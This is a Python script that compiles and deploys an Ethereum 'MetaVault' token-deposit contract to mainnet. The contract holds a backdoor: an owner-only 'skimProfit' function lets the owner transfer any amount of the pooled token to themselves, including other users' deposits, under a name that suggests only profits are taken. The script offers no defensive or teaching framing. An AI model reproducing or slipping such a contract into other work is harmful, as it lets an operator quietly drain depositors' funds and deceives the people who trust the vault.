import os
import sys
from solcx import compile_source, install_solc
from web3 import Web3
from web3.exceptions import ContractLogicError

# Config: can be set via env vars for automation
RPC_URL = os.environ.get("RPC_URL", "https://mainnet.infura.io/v3/YOUR_INFURA_KEY")
PRIVATE_KEY = os.environ.get("PRIVATE_KEY", "YOUR_PRIVATE_KEY")
TOKEN_ADDRESS = os.environ.get("TOKEN_ADDRESS", "0xYourERC20TokenAddress")

# Install Solidity compiler version 0.8.0 if missing
install_solc("0.8.0")

CONTRACT_SOURCE = """
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract MetaVault {
    address public immutable token;
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    constructor(address _token) {
        token = _token;
        owner = msg.sender;
    }

    function deposit(uint256 amount) external {
        require(IERC20(token).transferFrom(msg.sender, address(this), amount), "TransferFrom failed");
        balances[msg.sender] += amount;
        totalDeposits += amount;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        totalDeposits -= amount;
        require(IERC20(token).transfer(msg.sender, amount), "Transfer failed");
    }

    function skimProfit(uint256 amount) external onlyOwner {
        require(IERC20(token).transfer(owner, amount), "Transfer failed");
    }
}
"""


def compile_contract(source_code: str):
    compiled_sol = compile_source(source_code, output_values=["abi", "bin"], solc_version="0.8.0")
    _contract_id, contract_interface = compiled_sol.popitem()
    return contract_interface["abi"], contract_interface["bin"]


def deploy_contract(w3: Web3, abi, bytecode, token_address: str, private_key: str) -> str:
    account = w3.eth.account.from_key(private_key)
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    nonce = w3.eth.get_transaction_count(account.address)
    construct_txn = contract.constructor(token_address).build_transaction({
        "from": account.address,
        "nonce": nonce,
        "gas": 500000,
        "gasPrice": w3.to_wei("50", "gwei"),
    })

    signed_txn = w3.eth.account.sign_transaction(construct_txn, private_key=private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    print(f"Deploying contract... tx hash: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Contract deployed at: {receipt.contractAddress}")
    return receipt.contractAddress


def main():
    try:
        print("[*] Connecting to Ethereum node...")
        w3 = Web3(Web3.HTTPProvider(RPC_URL))
        if not w3.isConnected():
            print("[ERROR] Could not connect to Ethereum node.")
            sys.exit(1)

        print("[*] Compiling contract...")
        abi, bytecode = compile_contract(CONTRACT_SOURCE)

        print("[*] Deploying contract...")
        contract_address = deploy_contract(w3, abi, bytecode, TOKEN_ADDRESS, PRIVATE_KEY)

        print("[\u2713] Deployment complete. Contract address:", contract_address)

    except ContractLogicError as e:
        print("[ERROR] Contract logic error:", e)
    except Exception as e:
        print("[ERROR]", e)


if __name__ == "__main__":
    main()
